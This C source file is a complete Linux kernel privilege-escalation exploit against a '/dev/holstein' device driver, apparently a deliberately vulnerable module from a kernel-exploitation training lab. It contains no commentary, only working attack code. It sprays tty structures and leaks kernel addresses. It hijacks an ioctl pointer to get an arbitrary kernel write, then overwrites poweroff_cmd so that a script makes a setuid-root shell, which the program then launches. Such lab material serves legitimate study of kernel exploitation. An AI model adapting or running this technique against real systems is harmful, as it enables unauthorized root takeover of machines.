#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

int fd;
int tty[100];
int target = 0;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t g_buf;

uintptr_t poweroff_cmd		= 0xffffffff81e379c0;
uintptr_t mov_prdx_ecx		= 0xffffffff814b27c2;
uintptr_t orderly_poweroff	= 0xffffffff810750e0;

static void leak_offset_and_g_buf(void)
{
	uint8_t data[0x440];

	read(fd, data, 0x440);
	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
	printf("[+] g_buf %p\n", g_buf);
}

static void set_ioctl(uintptr_t ptr)
{
	uint8_t data[0x420];

	read(fd, data, 0x420);
	*(uintptr_t *)&data[0x0c * 8] = ptr;
	*(uintptr_t *)&data[0x418] = g_buf;

	write(fd, data, 0x420);
}

static int fast_ioctl(int op, uintptr_t argp)
{
	int ret;

	if (target) {
		ret = ioctl(target, op, argp);
	} else {
		for (int i = 0; i < 100; ++i) {
			ret = ioctl(tty[i], op, argp);
			if (ret != -1) {
				target = tty[i];
				break;
			}
		}
	}

	return ret;
}

static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
{
	size_t left = len;
	uint32_t tmp;

	set_ioctl(OFFSET(mov_prdx_ecx));

	for (int i = 0; i < len; i += 4, left -= 4) {
		if (left >= 4) {
			tmp = *(uint32_t *)(buf + i);
		} else {
			tmp = 0;
			for (int i = 0; i < left; ++i)
				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
				       << (3 - i) * 8;
		}

		fast_ioctl(tmp, ptr + i);
	}
}

static void poweroff(void)
{
	set_ioctl(OFFSET(orderly_poweroff));
	fast_ioctl(0, 0);
}

int main(void)
{
	for (int i = 0; i < 50; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	for (int i = 50; i < 100; ++i) {
		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
		if (tty[i] == -1) {
			perror("[-] open");
			return EXIT_FAILURE;
		}
	}

	leak_offset_and_g_buf();

	uint8_t evil[] = "/tmp/pwn.sh";
	aaw(OFFSET(poweroff_cmd), evil, sizeof(evil));

	system("echo -e '"
	       "#!/bin/sh\n"
	       "chown root:root /shell\n"
	       "chmod 6777 /shell"
	       "'"
	       ">/tmp/pwn.sh");
	system("chmod +x /tmp/pwn.sh");

	poweroff();
	sleep(3);

	printf("[+] get r00t!\n");
	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);

	close(fd);
	return EXIT_SUCCESS;
}
